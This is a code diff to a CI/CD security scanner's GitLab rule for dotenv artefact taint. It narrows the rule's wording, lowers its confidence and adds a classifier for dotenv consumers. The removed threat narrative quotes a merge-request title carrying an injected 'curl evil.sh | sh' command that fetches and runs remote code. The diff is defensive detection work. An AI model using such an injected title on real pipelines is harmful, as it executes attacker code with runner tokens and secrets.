@@ -189,11 +189,12 @@ class TaintPattern:
     def context_notes_for_matches(
         self, content: str, filepath: str, matches: list[tuple[int, str]]
     ) -> list[object | None] | None:
-        if not self.role_aware_shallow:
+        dotenv_script = self.kind_filter == "dotenv" and self.sink_kind_filter == "script"
+        if not matches or (not self.role_aware_shallow and not dotenv_script):
             return None
         from collections import Counter
 
-        from .shell_role import GitLabShellEvidence
+        from .shell_role import GitLabShellEvidence, classify_gitlab_dotenv_use
 
         selected = self._selected_paths(content, content.splitlines(), filepath)
         pairs = [(path.sink_line, _format_chain(path)) for path, _ in selected]
@@ -205,8 +206,12 @@ class TaintPattern:
             if len(indexes) != 1 or counts[match] != 1 or match_counts[match] != 1:
                 out.append(None)
                 continue
-            evidence = selected[indexes[0]][1]
-            out.append(evidence if isinstance(evidence, GitLabShellEvidence) else None)
+            path, evidence = selected[indexes[0]]
+            if dotenv_script:
+                evidence = classify_gitlab_dotenv_use(content, filepath, path)
+            elif not isinstance(evidence, GitLabShellEvidence):
+                evidence = None
+            out.append(evidence)
         return out
 
 
@@ -586,102 +591,23 @@ RULES = [
     ),
     Rule(
         id="TAINT-GL-003",
-        title=(
-            "Attacker-controlled CI variable persisted through a "
-            "``reports.dotenv`` artefact reaches a downstream job's "
-            "script (deep taint)"
-        ),
+        title="GitLab dotenv value reaches a downstream script consumer",
         severity=Severity.CRITICAL,
         platform=Platform.GITLAB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A writer job launders an attacker-controlled GitLab CI "
-            "variable (``$CI_COMMIT_TITLE``, "
-            "``$CI_MERGE_REQUEST_TITLE``, ``$CI_COMMIT_REF_NAME``, "
-            '...) into a line of the form ``echo "NAME=..." > '
-            "build.env`` and declares ``build.env`` as the job's "
-            "``artifacts.reports.dotenv:`` artefact.  GitLab's runner "
-            "parses the artefact and sets each line as a real "
-            "environment variable in every consumer job that "
-            "``needs:`` the writer (unless that ``needs:`` entry "
-            "explicitly opts out with ``artifacts: false``).  When "
-            "the consumer then shell-expands ``$NAME`` inside a "
-            "``script:``, ``before_script:``, or ``after_script:`` "
-            "line, the attacker's bytes execute in bash with the "
-            "runner's full GitLab token and every protected "
-            "variable.  This is the cross-job analogue of the "
-            "GitHub ``$GITHUB_ENV`` bridge caught by TAINT-GH-003 "
-            "and is GitLab's only built-in mechanism for passing "
-            "dynamic variables between jobs, so it's worth treating "
-            "every tainted ``reports.dotenv`` write as a critical "
-            "finding even when the consumer reference looks benign."
+            "The source shows a candidate flow from a CI variable through a configured "
+            "dotenv report and a needs relationship to a downstream script. The consumer "
+            "role and the effective binding determine which security conclusions this "
+            "occurrence can support. Actual values, execution and credentials require "
+            "runtime evidence."
         ),
         pattern=TaintPattern(kind_filter="dotenv"),
         remediation=(
-            "A writer job is persisting an attacker-controlled value "
-            "into its ``reports.dotenv`` artefact, and a job that "
-            "``needs:`` the writer then expands the resulting "
-            "environment variable in a shell context.  The dotenv "
-            "bridge is not a mitigation: the runner copies the raw "
-            "bytes across the ``needs:`` boundary unchanged, and the "
-            "consumer's shell will run whatever metacharacters the "
-            "attacker embedded in the source CI variable.\n"
-            "\n"
-            "  # BAD — bridges PR title into downstream shell\n"
-            "  producer:\n"
-            "    variables:\n"
-            "      RAW: $CI_MERGE_REQUEST_TITLE\n"
-            "    script:\n"
-            '      - echo "TITLE=$RAW" > build.env\n'
-            "    artifacts:\n"
-            "      reports:\n"
-            "        dotenv: build.env\n"
-            "  consumer:\n"
-            "    needs: [producer]\n"
-            "    script:\n"
-            '      - echo "title is $TITLE"\n'
-            "\n"
-            "Pick one of these fixes:\n"
-            "\n"
-            "  # GOOD — pass the value through a non-dotenv artefact\n"
-            "  # (plain file) and read it via ``printenv`` / ``cat``\n"
-            "  # in the consumer, so the shell never sees the value\n"
-            "  # as a substituted string.\n"
-            "  producer:\n"
-            "    variables:\n"
-            "      TITLE: $CI_MERGE_REQUEST_TITLE\n"
-            "    script:\n"
-            "      - printenv TITLE > title.txt\n"
-            "    artifacts:\n"
-            "      paths: [title.txt]\n"
-            "  consumer:\n"
-            "    needs: [producer]\n"
-            "    script:\n"
-            "      - some-tool --title-file title.txt\n"
-            "\n"
-            "  # GOOD — keep the dotenv artefact but opt the consumer\n"
-            "  # out of inheriting it, then read the value through the\n"
-            "  # consumer's own env: block after sanitising it.\n"
-            "  consumer:\n"
-            "    needs:\n"
-            "      - job: producer\n"
-            "        artifacts: false\n"
-            "\n"
-            "  # GOOD — don't bridge attacker data through dotenv at\n"
-            "  # all; bind the value in the consumer's ``variables:``\n"
-            "  # block and consume it via parameter expansion.\n"
-            "  consumer:\n"
-            "    variables:\n"
-            "      TITLE: $CI_MERGE_REQUEST_TITLE\n"
-            "    script:\n"
-            "      - SAFE='${TITLE//[^a-zA-Z0-9._ -]/}'\n"
-            '      - echo "$SAFE"\n'
-            "\n"
-            "If the dotenv bridge is only there to thread a value "
-            "through the pipeline, consider redeclaring the variable "
-            "at top-level or in the consumer's ``variables:`` instead "
-            "— the GitLab runner will set it directly, no artefact "
-            "required, and the flow is auditable in one place."
+            "Verify the producer and the consumer's effective variable binding. Keep "
+            "untrusted values out of interpreter program text. If the value selects a "
+            "publication destination, validate and bind the allowed target independently "
+            "of the producer. Check runtime authority and artifact access separately."
         ),
         reference="https://docs.gitlab.com/ci/yaml/artifacts_reports/#artifactsreportsdotenv",
         test_positive=[
@@ -798,19 +724,14 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An external contributor opens an MR whose title is "
-            '``"; curl evil.sh | sh ; #``.  The producer job copies '
-            "the title into ``$RAW`` via ``variables:``, then writes "
-            '``"TITLE=$RAW"`` into its ``reports.dotenv`` artefact.  '
-            "GitLab's runner parses the artefact and sets "
-            "``$TITLE`` in the environment of every job that "
-            "``needs:`` the producer.  The consumer's ``script:`` "
-            'runs ``echo "title is $TITLE"`` and bash executes the '
-            "injected command substitution with the runner's full "
-            "GitLab token, protected CI/CD variables, and SSH keys."
+            "An inherited dotenv value can affect the receiving command according to its "
+            "argument role. An interpreter operand can become code, while a publication "
+            "URL can select a different package or version. The effective source and "
+            "permissions depend on the selected job and runner."
         ),
         incidents=[],
-        confidence="high",
+        confidence="low",
+        review_needed=True,
     ),
     # =========================================================================
     # TAINT-GL-004 — cross-component input reference (GitLab CI Components,
